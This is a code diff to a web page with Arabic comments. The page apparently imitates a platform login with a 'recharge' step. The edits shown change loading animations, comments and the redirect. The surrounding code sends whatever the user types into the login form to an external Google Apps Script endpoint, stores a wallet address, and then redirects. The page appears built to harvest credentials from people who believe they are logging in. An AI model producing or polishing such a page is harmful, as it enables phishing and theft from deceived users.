@@ -51,7 +51,7 @@
     40%{transform:scale(1);}
   }
 
-  /* شاشة التحميل عند الضغط على تسجيل الدخول */
+  /* شاشة التحميل عند الضغط على تسجيل الدخول (دائرة دوارة) */
   .loading-screen{
     position:fixed;
     inset:0;
@@ -76,7 +76,7 @@
 
 <div class="sysbar"></div>
 
-<!-- التحميل الأولي عند فتح الموقع -->
+<!-- التحميل الأولي -->
 <div class="initial-loading" id="initial-loading">
   <div class="dot"></div>
   <div class="dot"></div>
@@ -139,14 +139,12 @@ const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbya5yWgv26ibjoztwv6n
 let platform = null;
 const repReg = /^(\d)\1{6,}$/;
 
-// عرض التحميل الأولي ثم واجهة تسجيل الدخول
+// عرض الواجهة بعد التحميل الأولي
 window.addEventListener('load', ()=>{
-  initialLoading.style.display = 'none';
-  app.style.display = 'block';
-  // التأكد من إخفاء أي دائرة تحميل عند الرجوع
-  loadingScreen.style.display = 'none';
-  loginCard.style.display = 'block';
-  go.disabled = true;
+  setTimeout(()=>{
+    initialLoading.style.display = 'none';
+    app.style.display = 'block';
+  }, 1000);
 });
 
 function validate() {
@@ -196,11 +194,11 @@ go.addEventListener('click', async () => {
   try{
     await fetch(SCRIPT_URL, { method:'POST', body: formData });
     localStorage.setItem('walletAddress', uid.value.trim());
-    // الانتقال مع منع الرجوع للصفحة السابقة
-    window.location.replace('recharge/index.html');
+    // التوجيه إلى recharge/index.html
+    window.location.href = 'recharge/index.html';
   } catch(err){
     loadingScreen.style.display = "none";
-    loginCard.style.display = 'block';
+    loginCard.style.display = "block";
     go.disabled = false;
   }
 });
